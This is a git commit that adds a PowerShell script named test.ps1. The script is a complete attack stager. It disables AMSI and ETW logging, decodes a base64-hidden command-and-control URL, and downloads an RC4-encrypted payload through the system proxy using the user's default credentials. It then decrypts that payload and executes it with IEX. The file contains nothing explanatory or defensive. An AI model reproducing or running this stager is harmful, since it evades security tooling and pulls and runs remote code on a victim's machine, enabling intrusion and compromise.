e1c1bcf438831a9c081ce80d14fb8d513a25ed7d
233Official <ayusummer233@gmail.com>
2023-08-28 19:04:47 +0800

    stash

---
+++ Powershell/test.ps1
@@ -0,0 +1,26 @@
+If ($PSVersionTable.PSVersion.Major -ge 3) { 
+    $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); 
+    $Ref.GetField('amsiInitFailed', 'NonPublic,Static').Setvalue($Null, $true); 
+    [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled', 'NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider', 'NonPublic,Static').GetValue($null), 0); 
+}; 
+[System.Net.ServicePointManager]::Expect100Continue = 0; 
+$wc = New-Object System.Net.WebClient; 
+$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'; 
+$ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADAAMAAuADEALgAxAC4AMQAzADYAOgA5ADAAOQAwAA=='))); 
+$t = '/login/process.php'; $wc.Headers.Add('User-Agent', $u); 
+$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy; 
+$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; 
+$Script:Proxy = $wc.Proxy; 
+$K = [System.Text.Encoding]::ASCII.GetBytes('Huv,3gtsc}#_E:fFXwn2bUPV|iMe0+5R'); 
+$R = { 
+    $D, $K = $Args; $S = 0..255; 0..255 | % {
+        $J = ($J + $S[$_] + $K[$_ % $K.Count]) % 256; $S[$_], $S[$J] = $S[$J], $S[$_] 
+    }; 
+    $D | % { $I = ($I + 1) % 256; $H = ($H + $S[$I]) % 256; $S[$I], $S[$H] = $S[$H], $S[$I]; $_-bxor$S[($S[$I] + $S[$H]) % 256] } 
+}; 
+$wc.Headers.Add("Cookie", "cHGAfdLZDCEtLMK=lLq8UwiEuzvIQD4j7p6IJshii1E="); 
+$data = $wc.DownloadData($ser + $t); 
+$iv = $data[0..3]; 
+$data = $data[4..$data.length]; 
+-join [Char[]](& $R $data ($IV + $K)) | IEX
+
